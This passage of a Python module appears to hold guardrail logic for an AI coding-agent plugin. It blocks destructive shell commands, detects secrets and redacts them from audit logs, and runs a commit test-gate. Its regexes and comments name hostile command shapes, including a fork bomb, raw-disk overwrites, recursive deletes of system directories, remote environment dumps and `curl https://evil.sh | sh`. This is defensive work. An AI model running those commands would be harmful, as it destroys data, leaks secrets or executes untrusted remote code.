"""Deterministic L4 guardrail logic (ADR 0019).

The hook scripts under ``plugin/hooks/scripts/`` are thin: they parse the Claude Code hook
payload and call these tested functions. Every decision here is deterministic so it is fast,
predictable, and unit-testable without a model.

- :func:`classify_command` — the **security** deny-list (block clearly-dangerous Bash).
- :func:`is_commit_or_push` / :func:`choose_gate` — the **test-gate** (which fast gate to run
  before a commit/push).
- :func:`redact_secrets` / :func:`audit_record` — the **logging** audit record.
- :func:`bump_and_check` — the **budgets** subagent counter (warn/block).
"""

from __future__ import annotations

import json
import re
import shlex
from dataclasses import dataclass
from pathlib import Path
from typing import Any

__all__ = [
    "Decision",
    "ALLOW",
    "classify_command",
    "is_commit_or_push",
    "is_pr_merge",
    "worktree_branches",
    "merge_preflight",
    "choose_gate",
    "gate_unrunnable",
    "GATE_UNRUNNABLE_EXIT_CODES",
    "tool_errored",
    "redact_secrets",
    "audit_record",
    "bump_and_check",
]

# Signatures in a gate's output that mean "the gate could not RUN" (environment breakage), not
# "the code failed the gate" — a non-zero exit carrying one of these must fail OPEN, not block a
# commit (ADR 0058/0059). Seen in the field: `npm run lint` with no `lint` script, or eslint not
# installed. Matched case-insensitively against the combined stdout+stderr.
#
# These are DELIBERATELY specific. A bare "not found" / "no such file" was too broad (ADR 0059):
# it matches genuine gate failures — pytest `fixture 'x' not found`, eslint `'y' not found in
# './m'`, an HTTP test asserting `404 Not Found`, gcc `foo.h: No such file or directory`, and even
# this repo's own `dev/validate.py` emitting `SKILL.md not found` — which would wrongly let broken
# code commit. The shell's own "command/file not found" (exit 127/126) is caught by exit code in
# the hook instead, so it needs no broad substring here.
_GATE_UNRUNNABLE = (
    "missing script",
    "command not found",  # "sh: eslint: command not found" (still matches; kept as belt-and-braces)
    "can't open file",  # python: can't open file '...': [Errno 2]
    "modulenotfounderror",
    "is not recognized",  # Windows "'eslint' is not recognized as an internal or external command"
    "executable not found",
)
# Shell exit codes that mean "the command itself could not run" — 127 (command not found), 126
# (found but not executable). The hook keys the fail-open on these too, so a shell "not found" is
# caught by code, not by an over-broad output substring (ADR 0059).
GATE_UNRUNNABLE_EXIT_CODES = frozenset({126, 127})


@dataclass(frozen=True)
class Decision:
    """A guardrail outcome. ``block`` -> the hook exits 2; a non-empty ``message`` with
    ``block=False`` -> a non-blocking warning (the hook prints it and exits 0)."""

    block: bool
    message: str = ""


ALLOW = Decision(False)


# --- security: dangerous-command deny-list -----------------------------------

# A target that means "everything": filesystem root, home, or a top-level system dir (NOT
# /tmp/x, ./build, ~/Downloads). Quotes are stripped before matching so "/" and '/usr' are seen.
_DANGER_TARGET = re.compile(
    r"(?:^|\s)(?:"
    r"/\*?"  # / or /*
    r"|~/?|\$HOME/?|\$\{HOME\}/?"  # home
    r"|/(?:usr|etc|bin|sbin|lib|lib64|boot|var|opt|root|home)(?:/\S*)?"  # system dirs
    r")(?:\s|$)"
)
_RM = re.compile(r"\brm\b")
_RM_RECURSIVE = re.compile(r"(?<![\w-])-\w*[rR]\w*\b|--recursive\b")
_RM_FORCE = re.compile(r"(?<![\w-])-\w*f\w*\b|--force\b")

_CHMOD = re.compile(r"\bchmod\b")
_CHMOD_RECURSIVE = re.compile(r"(?<![\w-])-\w*R\w*\b|--recursive\b")
# a permissive mode: 777 (any leading digit) or a symbolic grant of write/all (a+rwx, o+w, +w).
# NB: the symbolic clause is anchored with (?<![\w+=]) so re.search can't retry [ugoa]* at every
# position of a long run — without it a crafted `chmod -R ugoa…ugoa /etc` is quadratic ReDoS.
_PERMISSIVE_MODE = re.compile(r"(?<!\d)[0-7]?777\b|(?<![\w+=])[ugoa]*\+[rwxX]*[wx][rwxX]*|a=rwx\b")

# Raw-text blockers: shapes whose syntax is distinctive enough that quoting them as data is rare
# (the fork bomb glyphs; a shell redirect into a raw disk device). Everything else is checked on
# TOKENS in command position (ADR 0054) so quoted mentions never fire.
_BLOCKERS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"), "fork bomb"),
    (re.compile(r">\|?\s*/dev/(sd[a-z]|nvme\d|disk\d|mapper/)"), "write to a raw disk device"),
]
# mkfs/dd device writes for the LEGACY (unparseable-segment) path only; the primary check is
# token-level in _token_decision (command word mkfs*/dd + a /dev/ argument).
_LEGACY_DEVICE = re.compile(r"\bmkfs(\.\w+)?\b[^\n;&|]*/dev/|\bdd\b[^\n;&|]*\bof=/dev/")
# git push, tolerating global flags before the subcommand: `git -C dir push`, `git -c k=v push`,
# `git --no-pager push` (the old `git\s+push` missed these).
_GIT_PUSH = re.compile(r"\bgit\s+(?:-[cC]\s+\S+\s+|--\S+\s+|-\w\s+)*push\b")
_FORCE_FLAG = re.compile(r"--force\b|--force-with-lease\b|(?<![\w-])-\w*f\w*\b")
# a protected branch as a standalone arg OR a refspec destination (RHS of `src:dst`): `origin
# main`, `HEAD:main`, `develop:main` all match — but NOT release-2024 / feature/main-fix.
_PROTECTED_DEST = re.compile(r"(?:^|\s|:)\+?(?:main|master|release)(?::|\s|$)")
# a `+`-forced refspec whose destination is protected (force-push without the --force flag).
_PLUS_PROTECTED = re.compile(r"(?:^|\s)\+(?:\S*:)?(?:main|master|release)(?::|\s|$)")

_SEGMENT_SEP = re.compile(r"&&|\|\||[;\n|]")


def _segments(command: str) -> list[str]:
    """Split a command line into segments on shell separators (`;`, `&&`, `||`, `|`, newline) so a
    co-occurrence check only fires when its parts live in ONE command — e.g. `ls /usr && rm -rf
    build` must not be read as `rm -rf /usr`."""
    return [seg for seg in _SEGMENT_SEP.split(command) if seg.strip()]


def _seg_dangerous_rm(segment: str) -> bool:
    if not _RM.search(segment):
        return False
    unquoted = segment.replace('"', " ").replace("'", " ")  # so "/" and '/usr' are seen
    return bool(
        _RM_RECURSIVE.search(segment)
        and _RM_FORCE.search(segment)
        and _DANGER_TARGET.search(unquoted)
    )


def _seg_dangerous_chmod(segment: str) -> bool:
    if not _CHMOD.search(segment):
        return False
    unquoted = segment.replace('"', " ").replace("'", " ")
    return bool(
        _CHMOD_RECURSIVE.search(segment)
        and _PERMISSIVE_MODE.search(segment)
        and _DANGER_TARGET.search(unquoted)
    )


_FIND = re.compile(r"\bfind\b")
_FIND_DELETE = re.compile(r"(?<![\w-])-delete\b")
# a bare top-level root as find's start path (NOT a sub-path like /opt/app or /etc/x, which are
# targeted) — so `find /etc -delete` blocks but `find /opt/app -name '*.tmp' -delete` does not.
_FIND_TARGET = re.compile(
    r"(?:^|\s)(?:/\*?|~/?|\$HOME/?|\$\{HOME\}/?"
    r"|/(?:usr|etc|bin|sbin|lib|lib64|boot|var|opt|root|home)/?)(?:\s|$)"
)


def _seg_dangerous_find(segment: str) -> bool:
    if not (_FIND.search(segment) and _FIND_DELETE.search(segment)):
        return False
    return bool(_FIND_TARGET.search(segment.replace('"', " ").replace("'", " ")))


def _seg_dangerous_push(segment: str) -> bool:
    if not _GIT_PUSH.search(segment):
        return False
    if _PLUS_PROTECTED.search(segment):
        return True
    return bool(_FORCE_FLAG.search(segment) and _PROTECTED_DEST.search(segment))


def _legacy_segment_decision(segment: str) -> Decision:
    """The pre-ADR-0054 text-match checks, kept ONLY for a segment `shlex` cannot tokenize
    (unbalanced quotes etc.) — unparseable input degrades to the old, block-leaning behaviour
    rather than silently passing."""
    if _seg_dangerous_rm(segment):
        return Decision(True, _MSG_RM)
    if _seg_dangerous_chmod(segment):
        return Decision(True, _MSG_CHMOD)
    if _seg_dangerous_find(segment):
        return Decision(True, _MSG_FIND)
    if _LEGACY_DEVICE.search(segment):
        return Decision(True, _MSG_DEVICE)
    if _seg_dangerous_push(segment):
        return Decision(True, _MSG_PUSH)
    return ALLOW


# --- security: quote-aware command tokenization (ADR 0054) --------------------
# Production bundles showed the rm/chmod/find/push checks firing on commands that merely QUOTE a
# dangerous-looking string — `python3 -c "…'rm -rf /'…"`, `git commit -m "block rm -rf /"`,
# `grep "rm -rf /" docs/` — because segmentation split inside quotes and quote-stripping made data
# look like code. The primary path now (1) splits segments on `;`/`|`/`&`/newline OUTSIDE quotes,
# (2) tokenizes each segment with `shlex`, and (3) applies each rule only when its command is the
# segment's COMMAND WORD (after sudo/env-assignment/wrapper prefixes) — the same command-position
# principle ADR 0051 gave the net-pipe rule. Shell-executable payloads are still followed:
# `sh -c '…'` arguments, `$(…)` and backtick substitutions are re-classified recursively.

_MSG_RM = "blocked: recursive/forced delete of /, home, or a system dir"
_MSG_CHMOD = "blocked: recursive permissive chmod of /, home, or a system dir"
_MSG_FIND = "blocked: find -delete of /, home, or a system dir"
_MSG_DEVICE = "blocked: overwrite a filesystem/disk device"
_MSG_PUSH = "blocked: force-push to a protected branch (main/master/release)"

_ENV_ASSIGN = re.compile(r"^\w+=")
# Wrappers whose presence keeps us looking rightward for the real command word.
_WRAPPERS = frozenset({"sudo", "command", "exec", "nohup", "env", "time", "nice", "timeout"})
_NUMERICISH = re.compile(r"^\d+(?:\.\d+)?[smhd]?$")  # a timeout/nice duration/level argument

# Token-level (fullmatch) rule patterns. A token is one shell word with its quotes already
# stripped by shlex, so `"/"` and '/usr' are seen while a phrase inside a quoted string is ONE
# token that can never fullmatch a bare flag or path.
_TOK_RECURSIVE_RM = re.compile(r"-\w*[rR]\w*|--recursive")
_TOK_FORCE_RM = re.compile(r"-\w*f\w*|--force")
_TOK_RECURSIVE_CHMOD = re.compile(r"-\w*R\w*|--recursive")
_TOK_SHORT_F = re.compile(r"-\w*f\w*")
# rm/chmod targets: root, home, or a system dir INCLUDING sub-paths (`/etc/x` is still system
# damage), per the legacy _DANGER_TARGET semantics.
_TOK_DANGER_TARGET = re.compile(
    r"/\*?|~/?|\$HOME/?|\$\{HOME\}/?"
    r"|/(?:usr|etc|bin|sbin|lib|lib64|boot|var|opt|root|home)(?:/\S*)?"
)
# find start paths: only a bare root/system dir (a sub-path like /opt/app is targeted cleanup).
_TOK_FIND_TARGET = re.compile(
    r"/\*?|~/?|\$HOME/?|\$\{HOME\}/?"
    r"|/(?:usr|etc|bin|sbin|lib|lib64|boot|var|opt|root|home)/?"
)
_TOK_PLUS_PROTECTED = re.compile(r"\+(?:\S*:)?(?:main|master|release)")
_TOK_PROTECTED_DEST = re.compile(r"(?:\S*:)?(?:main|master|release)")
# Shell substitutions whose content the shell EXECUTES even inside double quotes.
_SUBSTITUTION = re.compile(r"\$\(([^()]{0,2000})\)|`([^`]{0,2000})`")
_SEPARATORS = frozenset(";|&\n")
_MAX_DEPTH = 2  # recursion cap for sh -c payloads / substitutions


def _split_segments(command: str) -> tuple[list[str], bool]:
    """Split ``command`` into segments on ``;``/``|``/``&``/newline **outside quotes**; the second
    element is False when a quote is left open (prose apostrophes, truncated input) — the caller
    then unions in the legacy naive split so an unparseable tail cannot mask a real hazard."""
    segments: list[str] = []
    current: list[str] = []
    quote: str | None = None
    escaped = False
    for ch in command:
        if escaped:
            current.append(ch)
            escaped = False
            continue
        if ch == "\\" and quote != "'":  # backslash escapes except inside single quotes
            current.append(ch)
            escaped = True
            continue
        if quote:
            current.append(ch)
            if ch == quote:
                quote = None
            continue
        if ch in "'\"":
            quote = ch
            current.append(ch)
            continue
        if ch in _SEPARATORS:
            if seg := "".join(current).strip():
                segments.append(seg)
            current = []
            continue
        current.append(ch)
    if seg := "".join(current).strip():
        segments.append(seg)
    return segments, quote is None


def _shell_tokens(segment: str) -> list[str] | None:
    """``segment`` as shell words (quotes stripped, escapes resolved), or None when it does not
    tokenize (unbalanced quotes) — the caller falls back to the legacy text checks."""
    try:
        return shlex.split(segment, posix=True)
    except ValueError:
        return None


def _command_index(tokens: list[str]) -> int | None:
    """Index of the segment's command word: skip env assignments (`K=v cmd`) and wrapper commands
    (`sudo`, `env`, `timeout 5`, …) plus their leading flags. A wrapper flag that takes a separate
    argument may mask the real command — the accident-guard trade-off documented in ADR 0054."""
    i, n = 0, len(tokens)
    while i < n:
        token = tokens[i]
        if _ENV_ASSIGN.match(token):
            i += 1
            continue
        if token.rsplit("/", 1)[-1] in _WRAPPERS:
            base = token.rsplit("/", 1)[-1]
            i += 1
            while i < n and tokens[i].startswith("-"):
                i += 1
            if base in ("timeout", "nice") and i < n and _NUMERICISH.match(tokens[i]):
                i += 1
            continue
        return i
    return None


def _dash_c_payload(rest: list[str]) -> str | None:
    """The command-string argument of a shell's ``-c`` (also combined, e.g. ``-lc``), or None."""
    for i, token in enumerate(rest):
        if re.fullmatch(r"-\w*c\w*", token):
            for candidate in rest[i + 1 :]:
                if not candidate.startswith("-"):
                    return candidate
    return None


def _token_decision(tokens: list[str], depth: int) -> Decision:
    """Apply the command-position deny rules to one tokenized segment."""
    ci = _command_index(tokens)
    if ci is None:
        return ALLOW
    base = tokens[ci].rsplit("/", 1)[-1]
    rest = tokens[ci + 1 :]
    flags = [t for t in rest if t.startswith("-")]
    args = [t for t in rest if not t.startswith("-")]

    if base == "rm":
        recursive = any(_TOK_RECURSIVE_RM.fullmatch(t) for t in flags)
        force = any(_TOK_FORCE_RM.fullmatch(t) for t in flags)
        if recursive and force and any(_TOK_DANGER_TARGET.fullmatch(t) for t in args):
            return Decision(True, _MSG_RM)
    elif base == "chmod":
        recursive = any(_TOK_RECURSIVE_CHMOD.fullmatch(t) for t in flags)
        permissive = any(_PERMISSIVE_MODE.search(t) for t in args)
        if recursive and permissive and any(_TOK_DANGER_TARGET.fullmatch(t) for t in args):
            return Decision(True, _MSG_CHMOD)
    elif base == "find":
        # find's start paths precede its predicates; default (no path) is `.` — never dangerous.
        if any(t == "-delete" for t in flags):
            first_path = args[0] if args else "."
            if _TOK_FIND_TARGET.fullmatch(first_path):
                return Decision(True, _MSG_FIND)
    elif base.startswith("mkfs"):
        if any(t.startswith("/dev/") for t in rest):
            return Decision(True, _MSG_DEVICE)
    elif base == "dd":
        if any(t.startswith("of=/dev/") for t in rest):
            return Decision(True, _MSG_DEVICE)
    elif base == "git":
        return _git_push_decision(rest)
    elif base in _NET_SH_FAMILY and depth < _MAX_DEPTH:
        payload = _dash_c_payload(rest)
        if payload:
            return _classify(payload, depth + 1)
    return ALLOW


def _git_push_decision(rest: list[str]) -> Decision:
    """Force-push-to-protected detection on tokens: global flags (`-c k=v`, `-C dir`, `--…`) are
    skipped to find the subcommand; only a `push` subcommand's own tokens are inspected, so a
    commit MESSAGE mentioning force/main can never fire. A bare `git push --force` (no explicit
    destination) stays allowed — the target branch is not knowable from the command string."""
    j = 0
    while j < len(rest):
        token = rest[j]
        if token in ("-c", "-C"):
            j += 2
            continue
        if token.startswith("-"):
            j += 1
            continue
        break
    if j >= len(rest) or rest[j] != "push":
        return ALLOW
    push_args = rest[j + 1 :]
    if any(_TOK_PLUS_PROTECTED.fullmatch(t) for t in push_args):
        return Decision(True, _MSG_PUSH)
    force = any(
        t in ("--force", "--force-with-lease") or _TOK_SHORT_F.fullmatch(t) for t in push_args
    )
    dest = any(_TOK_PROTECTED_DEST.fullmatch(t) for t in push_args if not t.startswith("-"))
    return Decision(True, _MSG_PUSH) if force and dest else ALLOW


def _classify(command: str, depth: int) -> Decision:
    """One classification pass (recursion-capped): raw blockers, net-pipe, then per-segment
    command-position rules with the legacy text fallback for unparseable segments."""
    if _dangerous_net_pipe(command):
        return Decision(True, "blocked: pipe a network download into a shell")
    if _remote_env_dump(command):
        return Decision(True, _MSG_ENV_DUMP)
    for pattern, reason in _BLOCKERS:
        if pattern.search(command):
            return Decision(True, f"blocked: {reason}")
    segments, balanced = _split_segments(command)
    if not balanced:
        # keep the quote-aware view AND the naive view — an open quote must not hide a hazard.
        segments = list(dict.fromkeys(segments + _segments(command)))
    for segment in segments:
        tokens = _shell_tokens(segment)
        decision = (
            _legacy_segment_decision(segment) if tokens is None else _token_decision(tokens, depth)
        )
        if decision.block:
            return decision
    if depth < _MAX_DEPTH:
        for match in _SUBSTITUTION.finditer(command):
            inner = match.group(1) or match.group(2) or ""
            if inner.strip():
                decision = _classify(inner, depth + 1)
                if decision.block:
                    return decision
    return ALLOW


# --- security: network-download-into-a-bare-interpreter (RCE) ----------------
# The `curl https://evil.sh | sh` accidental-RCE shape, aimed narrowly (ADR 0051): a download in
# COMMAND POSITION feeding a BARE interpreter (stdin becomes the program) from a NON-loopback host.
# Split groups on `;`/`&`/newline (the boundaries the old regex respected); the pipe chain lives in
# one group, so stages are split on `|`.
_NET_GROUP_SEP = re.compile(r"[;&\n]")
# a download tool as the leading word of a pipe stage (tolerating env-var + `sudo` prefixes).
_NET_DL = re.compile(r"^\s*(?:\w+=\S+\s+)*(?:sudo\s+)?(?:curl|wget|fetch)\b")
# an interpreter as the leading word of a pipe stage; group(1) = name, group(2) = its arguments.
_NET_INTERP = re.compile(
    r"^\s*(?:\w+=\S+\s+)*(?:sudo\s+)?((?:ba|z|k|da)?sh|python3?|perl|ruby|node)\b(.*)$"
)
# a loopback target anywhere in the group means "my own machine" — not an untrusted remote.
_NET_LOOPBACK = re.compile(r"localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|(?<![\w.])::1(?![\w.])")
# markers that an interpreter was handed an explicit program, so stdin is DATA (not the program):
_NET_PROG_C = re.compile(r"(?:^|\s)-c(?:\s|=|$)")  # inline command/script (all interpreters)
_NET_PROG_EVAL = re.compile(r"(?:^|\s)(?:-m|-e|-E|-p|--eval)\b")  # non-shell eval/module flags
_NET_SCRIPT_FILE = re.compile(r"(?:^|\s)[^\s|>&-]\S*\.(?:py|sh|bash|zsh|rb|pl|js|mjs|cjs)\b")
_NET_SH_FAMILY = {"sh", "bash", "zsh", "ksh", "dash"}


def _interp_reads_stdin_as_program(name: str, rest: str) -> bool:
    """True iff a piped interpreter would execute stdin AS ITS PROGRAM (the RCE case). False when it
    was handed an explicit program: `-c` (any), a script-file arg (any), or `-m`/`-e`/`-E`/`-p`/
    `--eval` for the NON-shell interpreters. A shell's `-e` is errexit (not eval), so `bash -e` is
    still treated as reading stdin — `curl … | bash -e` stays blocked."""
    if _NET_PROG_C.search(rest) or _NET_SCRIPT_FILE.search(rest):
        return False
    if name not in _NET_SH_FAMILY and _NET_PROG_EVAL.search(rest):
        return False
    return True


def _dangerous_net_pipe(command: str) -> bool:
    """True for a network download in command position piped into a bare interpreter from a
    non-loopback host (ADR 0051). Conservative: loopback targets, interpreters given an explicit
    program, and `curl`/`wget` appearing only as literal text are all allowed."""
    for group in _NET_GROUP_SEP.split(command):
        if _NET_LOOPBACK.search(group):
            continue
        stages = group.split("|")
        dl_idx = next((i for i, s in enumerate(stages) if _NET_DL.match(s)), None)
        if dl_idx is None:
            continue
        for stage in stages[dl_idx + 1 :]:
            m = _NET_INTERP.match(stage)
            if m and _interp_reads_stdin_as_program(m.group(1), m.group(2)):
                return True
    return False


# --- security: environment dumps on a REMOTE host (secret disclosure, ADR 0075) ---------------
# Field case: `kubectl exec <pod> -- printenv | grep SCORING_VNEXT` matched
# `SCORING_VNEXT_CRUX_API_KEY` — a prefix filter eventually matches a secret whose name STARTS with
# a non-secret prefix — and printed the credential into the transcript. Disclosure is irreversible,
# so this blocks rather than warns: the safe forms (exact name, or a redaction filter) are one edit
# away. Local dumps are untouched; only a dump reaching a remote/production host matches.
_REMOTE_EXEC = re.compile(
    r"(?:^|[\s;&|(])(?:kubectl|oc)\s+[^|;&]*?\bexec\b"
    r"|(?:^|[\s;&|(])(?:docker|podman|nerdctl)\s+[^|;&]*?\bexec\b"
    r"|(?:^|[\s;&|(])(?:docker|podman)[- ]compose\s+[^|;&]*?\bexec\b"
    r"|(?:^|[\s;&|(])ssh\b|(?:^|[\s;&|(])fly\s+ssh\b|(?:^|[\s;&|(])heroku\s+run\b"
)
# A BARE dump: the command word with no argument to narrow it (an argument means an exact lookup,
# e.g. `printenv PGHOST`, and `env VAR=1 cmd` / `set -e` are wrappers, not dumps).
_ENV_DUMP = re.compile(r"(?:^|[\s;&|]|--\s*)(?:printenv|env|set)\s*(?:$|[;&|\n])")
# An explicit redaction filter downstream makes the dump safe again (the documented remedy).
_ENV_REDACTION = re.compile(
    r"\bgrep\b[^|;&\n]*(?<![\w-])-\w*[vi]\w*\b[^|;&\n]*"
    r"(?:KEY|SECRET|PASSWORD|PASSWD|PWD|TOKEN|CRED)",
    re.IGNORECASE,
)

_MSG_ENV_DUMP = (
    "blocked: dumping the environment of a remote/production host leaks secrets into the "
    "transcript. Query the exact variable (`printenv PGHOST`) or append a redaction filter "
    "(`| grep -ivE 'KEY|SECRET|PASSWORD|PWD|TOKEN|CRED'`) — a prefix match eventually matches a "
    "secret whose name starts with a non-secret prefix."
)


def _remote_env_dump(command: str) -> bool:
    """True for a bare environment dump executed through a remote-exec wrapper, unredacted.

    Requires the dump to appear **after** the remote marker, so a local command that merely
    mentions `ssh` (``grep ssh printenv.txt``) does not match."""
    remote = _REMOTE_EXEC.search(command)
    if not remote or _ENV_REDACTION.search(command):
        return False
    return bool(_ENV_DUMP.search(command, remote.end()))


def classify_command(command: str) -> Decision:
    """Block (Decision.block) a clearly-dangerous Bash command; otherwise ALLOW.

    Conservative by design — a false block causes friction, so only unambiguous hazards match.
    Rules fire on the COMMAND WORD of a quote-aware segment (ADR 0054), so a command that merely
    quotes a dangerous-looking string (`git commit -m "block rm -rf /"`, a `python3 -c` script,
    a grep pattern) never blocks, while `sh -c` payloads and `$(…)`/backtick substitutions are
    followed recursively and unparseable segments degrade to the legacy text checks.
    """
    return _classify(command, 0)


# --- test-gate: fast gate before commit/push ---------------------------------

# git commit/push in command position (not "echo 'git commit'"), tolerating an env-var prefix
# (`VAR=val git commit`) and git global flags (`git -c k=v commit`, `git -C dir commit`).
_COMMIT_PUSH = re.compile(
    r"(?:^|[\n;&|]\s*)(?:\w+=\S+\s+)*git\s+(?:-[cC]\s+\S+\s+|--\S+\s+|-\w\s+)*(?:commit|push)\b"
)


def is_commit_or_push(command: str) -> bool:
    return bool(_COMMIT_PUSH.search(command))


# --- pre-merge preflight: local state that will break the merge's local half (ADR 0076) ------
# `gh pr merge` merges on the SERVER and then tries to update the local checkout. Two local
# conditions make that second half fail, both hit while developing this plugin: another worktree
# already holds the base branch ("'master' is already used by worktree"), and a local base branch
# ahead of its upstream ("Not possible to fast-forward, aborting"). Neither loses work — the merge
# itself succeeded both times — so this WARNS and never blocks (see ADR 0076 for why).

# `gh` global flags may carry a separate argument (`gh --repo o/n pr merge`), so accept any
# leading tokens that are not the `pr` subcommand itself.
_PR_MERGE = re.compile(r"(?:^|[\n;&|]\s*)(?:\w+=\S+\s+)*gh\s+(?:(?!pr\b)\S+\s+)*pr\s+merge\b")


def is_pr_merge(command: str) -> bool:
    """True for `gh pr merge` in command position (not a quoted mention of it)."""
    return bool(_PR_MERGE.search(command))


def worktree_branches(porcelain: str) -> dict[str, str]:
    """Parse `git worktree list --porcelain` into ``{worktree path: branch}``.

    Pure so the parsing is testable without a git repo; detached worktrees are omitted (they hold
    no branch and so cannot collide)."""
    result: dict[str, str] = {}
    path = ""
    for line in porcelain.splitlines():
        if line.startswith("worktree "):
            path = line[len("worktree ") :].strip()
        elif line.startswith("branch ") and path:
            result[path] = line[len("branch ") :].strip().removeprefix("refs/heads/")
    return result


def merge_preflight(
    base: str, worktrees: dict[str, str], ahead: int, *, main_root: str
) -> Decision:
    """Warn about local state that will break the local half of `gh pr merge`. Never blocks.

    ``worktrees`` is :func:`worktree_branches`' output, ``main_root`` the main checkout (which is
    *allowed* to hold ``base`` — that is the normal case), ``ahead`` how many commits local ``base``
    has that its upstream does not."""
    problems = []
    holders = [p for p, branch in worktrees.items() if branch == base and p != main_root]
    if holders:
        problems.append(
            f"a worktree holds '{base}' ({', '.join(sorted(holders))}) — `gh` cannot check it out; "
            f"`git worktree remove` it first"
        )
    if ahead > 0:
        problems.append(
            f"local '{base}' is ahead of its upstream by {ahead} — `gh` will fail to fast-forward "
            f"your checkout after the merge; `git fetch` and reconcile (the merge itself still "
            f"succeeds on the server)"
        )
    if not problems:
        return ALLOW
    return Decision(False, "pre-merge: " + "; ".join(problems))


def choose_gate(cwd: Path | str) -> list[str] | None:
    """The fast gate command to run before a commit/push, or None if no gate applies.

    Prefers the repo's own Tier-0 validator (`dev/validate.py`); otherwise the detected stack's
    lint command (by-stack). None means "nothing fast to check" (don't block).
    """
    cwd = Path(cwd)
    if (cwd / "dev" / "validate.py").is_file():
        return ["python", "dev/validate.py"]
    from agentic_forge import stacks

    lint = stacks.primary(cwd).toolchain.lint
    return lint.split() if lint else None


# --- logging: redacted audit record ------------------------------------------

_SECRETS = [
    # Prefixed API keys/tokens. Anthropic/OpenAI prefixes are matched explicitly (their bodies hold
    # internal hyphens, e.g. sk-ant-api03-…); the bare sk- form requires a hyphen-free run so an
    # ordinary hyphenated arg like `sk-region-us-east-1` is not blanked. Highest-value leak: this is
    # Anthropic's own tooling writing to an on-disk audit log.
    re.compile(r"\bsk-ant-[A-Za-z0-9_-]{16,}"),  # Anthropic
    re.compile(r"\bsk-proj-[A-Za-z0-9_-]{16,}"),  # OpenAI project
    re.compile(r"\bsk-[A-Za-z0-9]{20,}\b"),  # bare OpenAI (no internal hyphens)
    re.compile(r"\b[sr]k_(?:live|test)_[A-Za-z0-9]{16,}\b"),  # Stripe secret + restricted keys
    re.compile(r"\bgh[opsru]_[A-Za-z0-9]{20,}\b"),  # GitHub tokens (ghp/gho/ghs/ghr/ghu)
    re.compile(r"\bgithub_pat_[A-Za-z0-9_]{20,}\b"),  # GitHub fine-grained PAT
    re.compile(r"\bglpat-[A-Za-z0-9_\-]{16,}\b"),  # GitLab PAT
    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),  # AWS access-key id
    re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"),  # Google API key
    re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"),  # Slack
    re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"),  # JWT
    re.compile(r"-----BEGIN[^-]*PRIVATE KEY-----[\s\S]*?-----END[^-]*-----"),
    re.compile(r"(?<=://)[^/\s:@]+:[^/\s@]+(?=@)"),  # user:password in a URL
    re.compile(r"(?i)\bauthorization\b\s*:\s*\S+(\s+\S{4,})?"),
    re.compile(r"(?i)\bBearer\s+[A-Za-z0-9._\-]{16,}"),
    # key=value / key: value assignments. No leading \b on the keyword so AWS_SECRET_ACCESS_KEY
    # (underscore-joined, no word boundary before "secret") is still caught.
    re.compile(
        r"(?i)(api[_-]?key|secret\w*|access[_-]?key|token|password|passwd)"
        r"\s*[:=]\s*['\"]?[^\s'\"]{6,}"
    ),
]


def redact_secrets(text: str) -> str:
    """Replace secret-looking substrings with a placeholder (for safe audit logging)."""
    for pattern in _SECRETS:
        text = pattern.sub("[REDACTED]", text)
    return text


def _redact_truncate(value: Any, max_len: int) -> Any:
    """Redact + per-VALUE truncate ``tool_input`` so re-encoding yields VALID JSON (ADR 0052).

    The old approach truncated the whole JSON dump, corrupting long records mid-encoding; here each
    string is redacted then capped, and containers are walked, so `json.dumps` of the result parses
    cleanly and a downstream tool can recover each (capped) field."""
    if isinstance(value, str):
        red = redact_secrets(value)
        return red if len(red) <= max_len else red[:max_len] + "…"
    if isinstance(value, dict):
        return {str(k): _redact_truncate(v, max_len) for k, v in value.items()}
    if isinstance(value, list):
        return [_redact_truncate(v, max_len) for v in value]
    return value  # numbers / bools / None pass through unchanged


def audit_record(
    payload: dict[str, Any], *, max_len: int = 300, ts: str | None = None
) -> dict[str, Any]:
    """Build a compact, secret-redacted audit record from a PostToolUse hook payload. The ``input``
    field is a **valid** JSON string (each ``tool_input`` value redacted + capped, then re-encoded),
    so long records stay machine-readable (ADR 0052). ``ts`` (an ISO timestamp the impure hook
    stamps) is recorded when given, so the audit trail is time-windowable (ADR 0053); pure — the
    caller supplies the clock."""
    tool = str(payload.get("tool_name") or payload.get("tool") or "unknown")[:128]
    tool_input = payload.get("tool_input")
    if not isinstance(tool_input, dict):
        tool_input = {}
    brief = json.dumps(_redact_truncate(tool_input, max_len), sort_keys=True)
    record: dict[str, Any] = {"tool": tool, "input": brief}
    if ts:
        record["ts"] = str(ts)
    if payload.get("session_id"):
        record["session_id"] = str(payload["session_id"])[:128]
    if tool_errored(payload):
        record["error"] = True  # additive: absent on success, so old readers are unaffected
    return record


def gate_unrunnable(output: str) -> bool:
    """True if a fast-gate's combined output shows it could not **run** (missing script / tool /
    file) rather than that the code failed it (ADR 0058). Pure, case-insensitive; used to fail the
    commit-gate OPEN on environment breakage instead of blocking a commit for it."""
    low = (output or "").lower()
    return any(sig in low for sig in _GATE_UNRUNNABLE)


def tool_errored(payload: dict[str, Any]) -> bool:
    """True if a PostToolUse ``payload`` carries a **clear** signal that the tool call failed (ADR
    0058). Conservative — only an explicit signal counts, so a healthy call is never mislabelled:
    a ``tool_response`` dict with ``is_error``/``error`` true, a top-level ``is_error`` flag, or a
    ``tool_response`` string beginning ``Error:``. Pure."""
    if payload.get("is_error") is True:
        return True
    resp = payload.get("tool_response")
    if isinstance(resp, dict):
        return bool(resp.get("is_error") is True or resp.get("error") is True)
    if isinstance(resp, str):
        return resp.lstrip().startswith("Error:")
    return False


# --- budgets: per-session subagent counter -----------------------------------


def bump_and_check(counter_path: Path | str, *, soft: int, hard: int) -> Decision:
    """Increment the counter at ``counter_path`` and decide warn/block against soft/hard caps.

    Over ``hard`` -> block; over ``soft`` -> a non-blocking warning; otherwise ALLOW. The counter
    is a tiny integer file (one per session), so the budget is enforced across hook invocations.
    """
    path = Path(counter_path)
    try:
        # max(0, ...) so a hand-edited negative value can't silently disarm the cap
        count = max(0, int(path.read_text(encoding="utf-8").strip()))
    except (FileNotFoundError, ValueError):
        count = 0
    count += 1
